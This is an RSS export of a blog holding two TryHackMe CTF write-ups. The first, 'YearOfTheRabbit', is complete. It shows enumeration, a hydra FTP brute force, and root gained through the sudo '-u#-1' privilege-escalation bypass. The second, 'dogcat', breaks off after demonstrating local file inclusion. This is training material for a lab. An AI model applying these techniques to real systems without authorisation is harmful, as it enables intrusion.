<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Wed, 22 Apr 2020 11:05:19 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>YearOfTheRabbit | CTF write-up</title><description>&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/yearoftherabbit"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Year of the Rabbit&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Time to enter the warren...&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p&gt;Hello everyone, Today's challenge is full of surprises and I would suggest you be patient while doing it, and make sure not to get into the rabbit holes, this challenge is made by &lt;strong&gt;MuirlandOracle&lt;/strong&gt;. Hope you enjoy this write-up&lt;/p&gt;</description><link>http://localhost:2368/yearoftherabbit-ctf-write-up/</link><guid isPermaLink="false">5e9029ca5e61514e230adc69</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Wed, 22 Apr 2020 09:47:00 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg" medium="image"/><content:encoded>&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/yearoftherabbit"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Year of the Rabbit&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Time to enter the warren...&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;img src="http://localhost:2368/content/images/2020/04/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;p&gt;Hello everyone, Today's challenge is full of surprises and I would suggest you be patient while doing it, and make sure not to get into the rabbit holes, this challenge is made by &lt;strong&gt;MuirlandOracle&lt;/strong&gt;. Hope you enjoy this write-up let's get started with some enumeration.&lt;/p&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.104.51
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 08:02 UTC
Nmap scan report for ip-10-10-104-51.eu-west-1.compute.internal (10.10.104.51)
Host is up (0.00090s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:3B:DA:76:6F:16 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;&lt;strong&gt;FTP&lt;/strong&gt; on port 21, &lt;strong&gt;SSH&lt;/strong&gt; on 22, and 80 running &lt;strong&gt;HTTP&lt;/strong&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-09.27.14.png" class="kg-image" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster dir -u http://10.10.104.51/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.104.51/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/10 08:28:48 Starting gobuster
===============================================================
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2020/04/10 08:29:08 Finished
===============================================================
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After discovering some directories, we notice that we have two files one an mp4 video titled RickRolled and a style.css, trying to access the video will send us to the official clip in Youtube which I think it's an old meme. Going back to style.css something is interesting is over there. It's another directory that will lead us to a message asking to deactivate javascript, to do it go to about:config in Firefox and search for javascript and change the value from true to false and try again.&lt;br&gt;we notice that we've been redirected quickly to another page, trying once again but this time we will turn burpsuite up and intercept the requests and analyse them and see what we are dealing with.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-09.44.08.png" class="kg-image" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-15-at-13.png" class="kg-image" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-09-1.png" class="kg-image" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-09--1-.png" class="kg-image" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-21-at-18.png" class="kg-image" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;figcaption&gt;We notice a hidden directory is getting called by a php file called intermediary.php&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-21-at-18--1-.png" class="kg-image" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;/figure&gt;&lt;p&gt;visiting the site will lead us to a picture, and more steganography this time. We will successfully be able to get an FTP username and a password list.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# exiftool Hot_Babe.png 
ExifTool Version Number         : 11.80
File Name                       : Hot_Babe.png
Directory                       : .
File Size                       : 464 kB
File Modification Date/Time     : 2020:04:21 17:30:32+00:00
File Access Date/Time           : 2020:04:21 17:31:58+00:00
File Inode Change Date/Time     : 2020:04:21 17:30:32+00:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 512
Image Height                    : 512
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 512x512
Megapixels                      : 0.262
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# strings Hot_Babe.png&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;IEND
Ot9RrG7h2~24?
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&amp;amp;Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&amp;amp;
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&amp;amp;
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&amp;amp;=0Z
nR8&amp;amp;FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&amp;amp;GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
nJ90XzX&amp;amp;AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&amp;amp;^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&amp;amp;*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&amp;amp;bNl3#&amp;amp;l
zLH%Ot0Bw&amp;amp;c%9&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;note: removed the password from the list, to avoid cheating on challenges.&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# hydra -l ftpuser -P pass.lst ftp://10.10.63.165
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-21 17:39:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 83 login tries (l:1/p:83), ~6 tries per task
[DATA] attacking ftp://10.10.63.165:21/
[21][ftp] host: 10.10.63.165   login: ftpuser   password: xxxxxxxxxxxxx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-21 17:39:22
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;Brute-forcing the Ftp user with hydra&lt;/figcaption&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# ftp 10.10.63.165
Connected to 10.10.63.165.
220 (vsFTPd 3.0.2)
Name (10.10.63.165:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23 01:48 Eli's_Creds.txt
226 Directory send OK.
ftp&amp;gt; get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (1.1754 MB/s)
ftp&amp;gt; exit
221 Goodbye.
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Login into the FTPuser we will find a file called Eli's_Creds.txt that are encoded to BrainF**k, decoding it will give us access to the user Eli in the machine.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-21-at-18--2-.png" class="kg-image" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# ssh eli@10.10.63.165
The authenticity of host '10.10.63.165 (10.10.63.165)' can't be established.
ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.63.165' (ECDSA) to the list of known hosts.
eli@10.10.63.165's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;eli@year-of-the-rabbit:/home/gwendoline$ ls -la
total 24
drwxr-xr-x 2 gwendoline gwendoline 4096 Jan 23 00:49 .
drwxr-xr-x 4 root       root       4096 Jan 23 00:55 ..
lrwxrwxrwx 1 root       root          9 Jan 23 00:17 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 gwendoline gwendoline  220 Jan 23 00:16 .bash_logout
-rw-r--r-- 1 gwendoline gwendoline 3515 Jan 23 00:16 .bashrc
-rw-r--r-- 1 gwendoline gwendoline  675 Jan 23 00:16 .profile
-r--r----- 1 gwendoline gwendoline   46 Jan 23 00:42 user.txt
eli@year-of-the-rabbit:/home/gwendoline$ cat user.txt 
cat: user.txt: Permission denied
eli@year-of-the-rabbit:/home/gwendoline$&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we don't pay attention to the message poping in the start of the SSH session, we may dive in another rabbit hole ... the messages let us know that there's a hidden message for us in this machine, That message will contain the credentials of the user gwendoline that owns the user.txt flag.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;eli@year-of-the-rabbit:/home/gwendoline$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
eli@year-of-the-rabbit:/home/gwendoline$ cd /usr/games/s3cr3t/
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 23 00:46 .
drwxr-xr-x 3 root root 4096 Jan 23 00:45 ..
-rw-r--r-- 1 root root  138 Jan 23 00:46 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just xxxxxxxxxxxxx
Honestly!

Yours sincerely
   -Root
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cd
eli@year-of-the-rabbit:~$ su gwendoline
Password: 
gwendoline@year-of-the-rabbit:~$ ls
user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{****************************************}
gwendoline@year-of-the-rabbit:~$&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;Privilege escalation&lt;/blockquote&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;gwendoline@year-of-the-rabbit:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2&amp;gt;&amp;gt;/dev/null
-rwsr-xr-x 1 root root 40000 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 27416 Mar 29  2015 /bin/umount
-rwsr-xr-x 1 root root 40168 Nov 20  2014 /bin/su
-rwsr-xr-x 1 root root 30800 Nov  8  2014 /bin/fusermount
-rwsr-xr-x 1 root root 146160 Oct  5  2014 /bin/ntfs-3g
-rwsr-xr-x 1 root root 10568 Feb 13  2015 /usr/bin/vmware-user-suid-wrapper
-rwsr-sr-x 1 root root 10104 Apr  1  2014 /usr/bin/X
-rwsr-sr-x 1 root mail 89248 Feb 11  2015 /usr/bin/procmail
-rwsr-xr-x 1 root root 23168 Nov 28  2014 /usr/bin/pkexec
-rwsr-xr-x 1 root root 75376 Nov 20  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39912 Nov 20  2014 /usr/bin/newgrp
-rwsr-xr-x 1 root root 149568 Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 44464 Nov 20  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root 53616 Nov 20  2014 /usr/bin/chfn
-rwsr-xr-x 1 root root 3124160 Feb 17  2015 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 333560 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 14632 Nov 28  2014 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 294512 Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14200 Oct 15  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 464904 Mar 22  2015 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10248 Apr 15  2015 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 10104 Feb 24  2014 /usr/lib/eject/dmcrypt-get-device
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;we can run vi without password as root but only on the file user.txt owned by gwendoline&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;at this time, I ran through some difficulties trying to gain root account. But after digging for a while discovered that the sudo version used is vulnerable even though it's low severity, but this shows us that even the lowest vulns can be useful in pen-testing and dangerous. &lt;/p&gt;&lt;p&gt;[more about the vulnerability in link below]&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.cybersecurity-help.cz/vdb/SB2019101501"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;Privilege escalation in sudo&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;The vulnerability allows a local user to escalate privileges on the system.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.cybersecurity-help.cz/images/logo.png" alt="YearOfTheRabbit | CTF write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

# id
uid=0(root) gid=0(root) groups=0(root)
#
# cd /root
# ls
root.txt
# cat root.txt
THM{****************************************}
#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and we are root, we can get the root flag at the /root directory.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/eCqFYAVjjDksg" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/funny-meme-hacker-eCqFYAVjjDksg"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;</content:encoded></item><item><title>dogcat | THM write-up</title><description>&lt;p&gt;Hello everyone, Today's CTF is very special made by &lt;strong&gt;&lt;a href="https://tryhackme.com/p/jammy"&gt;Jammy&lt;/a&gt;&lt;/strong&gt; a user in &lt;strong&gt;Tryhackme&lt;/strong&gt;. Trust me even if this box is rated medium difficulty, You'll need to think a lot and be very patient. I guarantee you if you try hard in this challenge you'll learn a lot about LFI&lt;/p&gt;</description><link>http://localhost:2368/dogcat-thm-write-up/</link><guid isPermaLink="false">5e9ace85da86f68ecc6f0649</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Sun, 19 Apr 2020 10:33:05 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/dc.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/dc.png" alt="dogcat | THM write-up"&gt;&lt;p&gt;Hello everyone, Today's CTF is very special made by &lt;strong&gt;&lt;a href="https://tryhackme.com/p/jammy"&gt;Jammy&lt;/a&gt;&lt;/strong&gt; a user in &lt;strong&gt;Tryhackme&lt;/strong&gt;. Trust me even if this box is rated medium difficulty, You'll need to think a lot and be very patient. I guarantee you if you try hard in this challenge you'll learn a lot about LFI (local-file-inclusion), log poising, and containers escaping.&lt;/p&gt;&lt;blockquote&gt;Enumeration&lt;/blockquote&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.132.16
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-18 09:56 UTC
Nmap scan report for ip-10-10-132-16.eu-west-1.compute.internal (10.10.132.16)
Host is up (0.00091s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
MAC Address: 02:34:7F:5C:5A:88 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;After doing some enumeration with nmap, there's two port open &lt;strong&gt;SSH&lt;/strong&gt; on 22 and &lt;strong&gt;HTTP&lt;/strong&gt; on 80&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/dirsearch# ./dirsearch.py -u http://10.10.132.16/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --extensions-list

 _|. _ _  _  _  _ _|_    v0.3.9                                                     
(_||| _) (/_(_|| (_| )                                                              
                                                                                    
Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 220521                                                          

Error Log: /root/dirsearch/logs/errors-20-04-18_10-02-52.log

Target: http://10.10.132.16/                                                        
                                                                                    
[10:02:52] Starting: 
[10:02:52] 200 -  418B  - /
[10:02:57] 301 -  311B  - /cats  -&amp;gt;  http://10.10.132.16/cats/
[10:03:00] 301 -  311B  - /dogs  -&amp;gt;  http://10.10.132.16/dogs/
[10:05:19] 403 -  277B  - /server-status                                    
                                                                                
Task Completed&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;ran some directory enum, nothing special just 10 dog pictures in &lt;strong&gt;dogs/&lt;/strong&gt; and 10 cat pictures &lt;strong&gt;cats/&lt;/strong&gt; folders&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;visiting the frontend we can see those pictures from the folders being called randomly every time you click cat or dog.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-18-at-10.58.32.png" class="kg-image" alt="dogcat | THM write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-18-at-10.58.44.png" class="kg-image" alt="dogcat | THM write-up"&gt;&lt;/figure&gt;&lt;p&gt;we can see that ?view= is taking care of calling the php files to execute the function that will show us at the end the doggies or kitties, what if we like dogs and cats. Nope!, doesn't like it and we get nothing. well technically not nothing, we get an error that tells us that it fails d to open the file because it doesn't exist. anything we add to view it adds to it .php at the end and if it does exist in the folder &lt;strong&gt;/var/www/html/&lt;/strong&gt; it will call it if not, it will show the error again.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-18-at-11.34.09.png" class="kg-image" alt="dogcat | THM write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-19-at-08.50.52.png" class="kg-image" alt="dogcat | THM write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-19-at-08.51.13.png" class="kg-image" alt="dogcat | THM write-up"&gt;&lt;figcaption&gt;and we have access to &lt;strong&gt;/etc/passwd&lt;/strong&gt; we can see the users we have&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;the next thing we can do some log poisoning, If you are not familiar with log poisoning, I suggest visiting this link and read the article before moving forward.&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;blockquote class="wp-embedded-content"&gt;&lt;a href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/"&gt;Apache Log Poisoning through LFI&lt;/a&gt;&lt;/blockquote&gt;
&lt;script type="text/javascript"&gt;
&lt;!--//--&gt;&lt;![CDATA[//&gt;&lt;!--
		/*! This file is auto-generated */
		!function(d,l){"use strict";var e=!1,o=!1;if(l.querySelector)if(d.addEventListener)e=!0;if(d.wp=d.wp||{},!d.wp.receiveEmbedMessage)if(d.wp.receiveEmbedMessage=function(e){var t=e.data;if(t)if(t.secret||t.message||t.value)if(!/[^a-zA-Z0-9]/.test(t.secret)){var r,a,i,s,n,o=l.querySelectorAll('iframe[data-secret="'+t.secret+'"]'),c=l.querySelectorAll('blockquote[data-secret="'+t.secret+'"]');for(r=0;r&lt;c.length;r++)c[r].style.display="none";for(r=0;r&lt;o.length;r++)if(a=o[r],e.source===a.contentWindow){if(a.removeAttribute("style"),"height"===t.message){if(1e3&lt;(i=parseInt(t.value,10)))i=1e3;else if(~~i&lt;200)i=200;a.height=i}if("link"===t.message)if(s=l.createElement("a"),n=l.createElement("a"),s.href=a.getAttribute("src"),n.href=t.value,n.host===s.host)if(l.activeElement===a)d.top.location.href=t.value}}},e)d.addEventListener("message",d.wp.receiveEmbedMessage,!1),l.addEventListener("DOMContentLoaded",t,!1),d.addEventListener("load",t,!1);function t(){if(!o){o=!0;var e,t,r,a,i=-1!==navigator.appVersion.indexOf("MSIE 10"),s=!!navigator.userAgent.match(/Trident.*rv:11\./),n=l.querySelectorAll("iframe.wp-embedded-content");for(t=0;t&lt;n.length;t++){if(!(r=n[t]).getAttribute("data-secret"))a=Math.random().toString(36).substr(2,10),r.src+="#?secret="+a,r.setAttribute("data-secret",a);if(i||s)(e=r.cloneNode(!0)).removeAttribute("security"),r.parentNode.replaceChild(e,r)}}}}(window,document);
//--&gt;&lt;!]]&gt;
